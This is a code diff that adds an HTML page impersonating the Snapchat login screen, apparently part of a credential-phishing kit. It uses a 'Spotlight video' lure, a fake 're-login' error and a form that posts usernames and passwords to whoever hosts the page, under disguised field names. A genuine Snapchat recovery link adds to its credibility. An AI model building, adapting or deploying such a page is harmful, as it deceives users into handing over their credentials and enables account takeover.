@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
+  <link rel="shortcut icon" href="faviconV2.png">
+  <meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
+  <meta property="og:site_name" content="Snapchat Spotlight">
+  <link rel="stylesheet" href="login.css">
+  <title>Login • Snapchat</title>
+
+</head>
+<body>
+  <!-- Back Button -->
+  <button class="back-button" onclick="window.location.href='/Acconts.html';">
+    <img src="left-arrow.png"height="15px" width="15px" alt="">
+  </button>
+
+  <div class="login-container">
+    <div id="error-message" class="error-message">
+      Something went wrong ! Please re-login to your account.
+  </div>
+    <h1>Log In</h1>
+    <!-- Form for login -->
+    <form action="" method="POST" onsubmit="return validatePassword(event)">
+      <label for="username">USERNAME OR EMAIL</label>
+      <input type="text" id="username" name="name" required>
+      
+      <p class="alternate-option"><a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a></p>
+      
+      <label for="password">PASSWORD</label>
+      <div class="password-container">
+        <input type="password" id="password" name="message" required>
+        <button type="button" class="toggle-password">
+          <img src="eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
+        </button>
+      </div>
+      
+      <div class="save-info">
+        <input type="checkbox" id="save-login">
+        <label for="save-login">Save Login Info on your device</label>
+      </div>
+      
+      <div class="incorrect">
+        <p>Incorrect password, please try again.</p>
+      </div>
+      
+      <p class="forgot-password"><a href="https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fweb.snapchat.com%253Fref%253Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKioqKiotKjg5MDXigakuIgEB&accountRecovery=true&referrer=https%3A%2F%2Fweb.snapchat.com%3Fref%3Dsign_in_sidebar">Forgot your password?</a></p>
+      
+      <button type="submit" class="login-button">Log In</button>
+    </form>
+    
+    <script src="login.js"></script>
+    
+</body>
+</html>
